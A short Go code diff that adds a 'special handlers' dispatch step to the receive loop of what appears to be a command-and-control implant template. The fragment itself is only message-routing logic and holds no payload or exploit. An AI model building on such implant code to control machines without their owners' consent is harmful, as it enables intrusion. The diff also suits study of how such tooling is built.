@@ -73,9 +73,12 @@ func mainLoop(connection *transports.Connection) {
 
 	tunHandlers := handlers.GetTunnelHandlers()
 	sysHandlers := handlers.GetSystemHandlers()
+	specialHandlers := handlers.GetSpecialHandlers()
 
 	for envelope := range connection.Recv {
-		if handler, ok := sysHandlers[envelope.Type]; ok {
+		if handler, ok := specialHandlers[envelope.Type]; ok {
+			handler(envelope.Data, connection)
+		} else if handler, ok := sysHandlers[envelope.Type]; ok {
 			// {{if .Debug}}
 			log.Printf("[recv] sysHandler %d", envelope.Type)
 			// {{end}}
